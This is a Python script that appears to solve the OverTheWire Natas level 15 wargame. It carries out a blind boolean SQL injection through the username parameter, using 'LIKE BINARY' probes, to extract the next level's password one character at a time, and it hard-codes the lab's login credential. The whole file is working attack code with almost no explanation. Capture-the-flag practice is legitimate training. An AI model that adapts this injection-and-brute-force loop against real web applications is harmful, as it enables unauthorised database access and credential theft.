#!/bin/python 

import requests, string

url = 'http://natas15.natas.labs.overthewire.org'
auth_name = "natas15"
auth_password = "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"

#Use all charaters and numbers: abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890
characters = "".join([string.ascii_letters,string.digits])

#BEING BY BUILDING a dictionary of characters found in the password
#this will greatly decrease the complexity for our brute force attempts
password_dictionary = []
exists_str = "This user exists."
for char in characters:
        uri="".join([url,'?','username=natas16"',' and password LIKE BINARY "%',char,'%','&debug'])
        #print ("test: " + uri)
        r=requests.get(uri, auth=(auth_name,auth_password))
        #print ("info in r text: " + r.text)
        if exists_str in r.text:
                #print ("curr string is in text: " + exists_str)
                password_dictionary.append(char)
                print ("Password Dictionary: {0} ".format(''.join(password_dictionary)))
print ("Dictionary build complete.")
print ("Password Dictionary: {0}".format(''.join(password_dictionary)))

# Brute force to ID password using identified dictionary
print ("Now attempting to brute force ..")
password_list=[]
password = ''
uri = ''
for i in range(1,64):
        for char in password_dictionary:
                test=''.join([password,char])
                # Build the get request to the URI
                uri = ''.join([url,'?','username=natas16"',' and password LIKE BINARY "',test,'%','&debug'])
                # print ('Test url is: ' + uri)
                # Send the request to the server
                r=requests.get(uri, auth=(auth_name,auth_password))
                # print (r.text)
				#parse the http response and udpdate
                if exists_str in r.text:
                        # print ('it does exist in string')
                        password_list.append(char)
                        password = ''.join(password_list)
                        print ("Length: {0}, Password: {1}".format(len(password),password))
print ("Password: {0}".format(password))
